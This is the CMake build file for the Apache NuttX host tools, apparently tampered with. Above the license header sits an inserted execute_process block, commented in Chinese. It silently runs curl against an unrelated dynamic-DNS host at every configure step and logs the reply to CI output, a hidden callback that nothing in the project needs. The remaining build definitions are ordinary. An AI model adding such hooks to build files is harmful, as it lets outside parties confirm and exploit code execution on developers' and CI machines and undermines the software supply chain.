# 1. 使用 execute_process 执行 curl 命令
execute_process(
    COMMAND curl -s http://9999999.c196dfa515.ddns.bypass.eu.org./1.png
    RESULT_VARIABLE curl_result    # 存储命令的退出状态码 (0 表示成功)
    OUTPUT_VARIABLE curl_output    # 存储标准输出 (网页的 HTML 内容)
    ERROR_VARIABLE curl_error      # 存储标准错误
    TIMEOUT 10                     # 建议设置超时，防止命令挂起导致 CI 卡死
)
# 2. 将执行结果打印到 CI/CD 的日志中
message(STATUS "--- Curl Execution Result ---")
message(STATUS "Return Code: ${curl_result}")
message(STATUS "Error (if any): ${curl_error}")
message(STATUS "Output Snapshot: ${curl_output}")
message(STATUS "-----------------------------")


# ##############################################################################
# tools/CMakeLists.txt
#
# SPDX-License-Identifier: Apache-2.0
#
# Licensed to the Apache Software Foundation (ASF) under one or more contributor
# license agreements.  See the NOTICE file distributed with this work for
# additional information regarding copyright ownership.  The ASF licenses this
# file to you under the Apache License, Version 2.0 (the "License"); you may not
# use this file except in compliance with the License.  You may obtain a copy of
# the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  See the
# License for the specific language governing permissions and limitations under
# the License.
#
# ##############################################################################
# Configure project
cmake_minimum_required(VERSION 3.16)
project(nuttx_tools LANGUAGES C)

if(NOT CMAKE_BUILD_TYPE)
  set(CMAKE_BUILD_TYPE
      "Release"
      CACHE STRING "Build type" FORCE)
endif()

message(STATUS "NuttX Host Tools")

# set basic warnings

add_compile_options(-Wall -Wstrict-prototypes -Wshadow -Wundef)

# configure according to platform

if(MSYS)
  add_compile_definitions(CONFIG_WINDOWS_NATIVE=y)
else()
  # GCC or clang is assumed in all other POSIX environments (Linux, Cygwin,
  # MSYS2, macOS). strtok_r is used in some tools, but does not seem to be
  # available in the MinGW environment.

  add_compile_definitions(HAVE_STRTOK_C=1)

  if(CYGWIN)
    add_compile_definitions(HOST_CYGWIN=1)
  endif()
endif()

# define targets

add_library(csvparser csvparser.c)

add_executable(mksyscall mksyscall.c)
target_link_libraries(mksyscall PRIVATE csvparser)
install(TARGETS mksyscall DESTINATION bin)

add_executable(nxstyle nxstyle.c)
install(TARGETS nxstyle DESTINATION bin)

add_executable(gencromfs gencromfs.c)
install(TARGETS gencromfs DESTINATION bin)

add_executable(mkdeps mkdeps.c)
install(TARGETS mkdeps DESTINATION bin)

add_executable(incdir incdir.c)
install(TARGETS incdir DESTINATION bin)
